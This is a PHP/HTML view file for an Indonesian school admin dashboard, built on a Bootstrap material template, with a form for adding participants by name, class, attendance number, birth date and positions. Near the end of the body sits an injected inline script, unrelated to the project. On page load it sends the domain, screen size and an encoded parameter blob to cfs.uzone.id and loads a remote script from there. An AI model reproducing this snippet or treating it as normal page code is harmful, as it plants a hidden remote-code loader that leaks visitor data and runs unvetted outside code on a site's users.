<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <link rel="apple-touch-icon" sizes="76x76" href="<?php echo base_url().'assets/'; ?>dashboard/img/apple-icon.png" />
    <link rel="icon" type="image/png" href="<?php echo base_url().'assets/'; ?>dashboard/img/favicon.png" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <title>Wunder - Bootstrap Material Admin Dashboard Template</title>
    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
    <meta name="viewport" content="width=device-width" />
    <!-- Bootstrap core CSS     -->
    <link href="<?php echo base_url().'assets/'; ?>dashboard/css/bootstrap.min.css" rel="stylesheet" />
    <link href="<?php echo base_url().'assets/'; ?>dashboard/vendors/material.min.css" rel="stylesheet" />
    <!--  Material Dashboard CSS    -->
    <link href="<?php echo base_url().'assets/'; ?>dashboard/css/wunder.css" rel="stylesheet" />
    <!--  CSS for Demo Purpose, don't include it in your project     -->
    <link href="<?php echo base_url().'assets/'; ?>dashboard/css/demo.css" rel="stylesheet" />
    <!--     Fonts and icons     -->
    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Material+Icons" />
    <link href="<?php echo base_url().'assets/'; ?>dashboard/vendors/dropzone/dropzone.min.css" rel="stylesheet">
</head>
<body>
<div class="wrapper">
    <?php $this->load->view('part/nav_admin'); ?>
    <div class="main-panel">
        <nav class="navbar navbar-toggleable-md navbar-default navbar-absolute navbar-inverse" data-topbar-color="blue">
            <div class="navbar-minimize">
                <button id="minimizeSidebar" class="btn btn-round btn-white btn-fill btn-just-icon">
                    <i class="material-icons visible-on-sidebar-regular f-26">keyboard_arrow_left</i>
                    <i class="material-icons visible-on-sidebar-mini f-26">keyboard_arrow_right</i>
                </button>
            </div>
            <div class="navbar-header d-flex">
                <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse"
                        data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent"
                        aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <a class="navbar-brand" href="#"> Calon Peserta </a>
            </div>
            <div class="collapse navbar-collapse">
                <ul class="navbar-nav ml-auto">
                    <li class="nav-item">
                        <a href="" class="nav-link" data-toggle="dropdown">
                            <p>selamat datang Ahmad Ichsanul Karim</p>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="http://localhost/orong2">
                            <i class="material-icons">home</i>
                        </a>
                    </li>
            </div>
        </nav>
        <div class="content">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-lg-12">
                        <div class="card">
                            <form method="post" action="<?php echo base_url('index.php/peserta/tambah/'.$_SESSION['name']); ?>" class="form-horizontal">
                                <div class="card-header card-header-text">
                                    <h4 class="card-title">Tambah Peserta</h4>
                                </div>
                                <div class="card-content">
                                    <div class="form-group row">
                                        <label class="col-md-2 col-form-label text-right">Nama</label>
                                        <div class="col-md-10">
                                            <input required name="nama" type="text" class="form-control" placeholder="Masukkan Nama Peserta">
                                        </div>
                                    </div>
                                    <div class="form-group row">
                                        <label class="col-md-2 col-form-label text-right">Kelas</label>
                                        <div class="col-md-3">
                                            <div class="dropdown">
                                                <select required id="sort" name="kelas" class="dropdown-toggle btn btn-primary btn-round btn-block">
                                                    <option selected disabled class="dropdown-item">Pilih Kelas Peserta</option>
                                                    <option value="4A" class="dropdown-item">4A</option>
                                                    <option value="4B" class="dropdown-item">4B</option>
                                                    <option value="4C" class="dropdown-item">4C</option>
                                                    <option value="5A" class="dropdown-item">5A</option>
                                                    <option value="5B" class="dropdown-item">5B</option>
                                                    <option value="5C" class="dropdown-item">5C</option>
                                                    <option value="6A" class="dropdown-item">6A</option>
                                                    <option value="6B" class="dropdown-item">6B</option>
                                                    <option value="6C" class="dropdown-item">6C</option>
                                                </select>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="form-group row">
                                        <label class="col-md-2 col-form-label text-right">No. Absen</label>
                                        <div class="col-md-10">
                                            <input required name="absen" type="text" class="form-control" placeholder="Masukkan Nomor Absen">
                                        </div>
                                    </div>
                                    <div class="form-group row">
                                        <label class="col-md-2 col-form-label text-right">Tanggal Lahir</label>
                                        <div class="col-md-10">
                                            <input required name="ttl" type="text" class="form-control datepicker" placeholder="Pilih Tanggal"/>
                                        </div>
                                    </div>
                                    <div class="form-group row">
                                        <label class="col-md-2 col-form-label text-right">Pilih Posisi</label>
                                        <div class="col-md-10">
                                            <?php $n = 0;
                                            foreach ($data as $value){ ?>
                                            <div class="checkbox form-check-inline">
                                                <label>
                                                    <input type="checkbox" id="posisi-<?php echo $n; ?>" name="posisi[]" value="<?php echo $value['id_posisi']; ?>"><?php echo $value['nama_posisi']; ?>
                                                </label>
                                            </div>
                                            <?php $n++;
                                            } ?>
                                        </div>
                                    </div>
                                    <button type="submit" id="submit" class="btn btn-primary btn-round">
                                        <i class="material-icons">assignment</i> Submit
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKfShJlVzsZFFZ%2fgdpncIm0nW%2bCAdz6ZpL81wEaQ0X6GE3pwqphFD%2bUSzPBlqyoWBfS2ZoX2tIUdkoEtI2BJOFxME%2b0alKNi9D%2b3bDf65pMGHlSNYvPj%2fJduf47QCTrU6JS3s4CQ32XzTJFgRtP1cx9wOW%2bbm358xrcqUeNK5E5ETWfU4x%2fq1RvnsdIJvVhHIEFKqUMIQ2fmDH8pmBZC%2fvU4LSU6zeiaXWdoxxjocyD8%2bX9mSXWafQz6JDx6vooIjti3jf4FjBrIcDDl8PVSlMW%2bpwi7AfrpdZ6uHqUG%2bh%2brYiEFvmc%2bZWcuCxqIa6W7cKsHYLvEnr%2fT7bK%2b5wUCFFE5pOBUI2vEzap14es%2b3dltgVrCfwIY%2bJjOBtm0Fg8a0HOrSylO%2bGfykCD9o%2f5O0YWQxBeC3SEkJQ9t7XiGOPHlrYPU3qonTZTIKPhlFI9T%2f73usjS1DiBMey8pGKpRsNNQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
<!--   Core JS Files   -->
<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/jquery-3.1.1.min.js" type="text/javascript"></script>
<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/jquery-ui.min.js" type="text/javascript"></script>
<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/tether.min.js" type="text/javascript"></script>

<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/bootstrap.min.js" type="text/javascript"></script>
<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
<!-- Forms Validations Plugin -->
<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/jquery.validate.min.js"></script>
<!--  Plugin for Date Time Picker and Full Calendar Plugin-->
<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/moment.min.js"></script>
<!--  Charts Plugin -->
<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/chartist.min.js"></script>
<!--  Plugin for the Wizard -->
<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/jquery.bootstrap-wizard.js"></script>
<!--  Notifications Plugin    -->
<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/bootstrap-notify.js"></script>
<!-- DateTimePicker Plugin -->
<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/bootstrap-datetimepicker.js"></script>
<!-- Vector Map plugin -->
<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/jquery-jvectormap.js"></script>
<!-- Sliders Plugin -->
<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/nouislider.min.js"></script>
<!--  Google Maps Plugin    -->
<script src="https://maps.googleapis.com/maps/api/js"></script>
<!-- Select Plugin -->
<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/jquery.select-bootstrap.js"></script>
<!-- Sweet Alert 2 plugin -->
<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/sweetalert/sweetalert2.min.js"></script>
<!--	Plugin for Fileupload, full documentation here: http://www.jasny.net/bootstrap/javascript/#fileinput -->
<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/jasny-bootstrap.min.js"></script>
<!--  Full Calendar Plugin    -->
<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/fullcalendar.min.js"></script>
<!-- TagsInput Plugin -->
<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/jquery.tagsinput.js"></script>
<!-- Material Dashboard javascript methods -->
<script src="<?php echo base_url().'assets/'; ?>dashboard/js/wunder.min.js"></script>
<!-- Material Dashboard DEMO methods, don't include it in your project! -->
<script src="<?php echo base_url().'assets/'; ?>dashboard/js/demo.min.js"></script>
<script src="<?php echo base_url().'assets/'; ?>dashboard/vendors/dropzone/dropzone.min.js"></script>
<script>
    $(document).ready(function () {
        console.log('ready');
    });
</script>

</html>
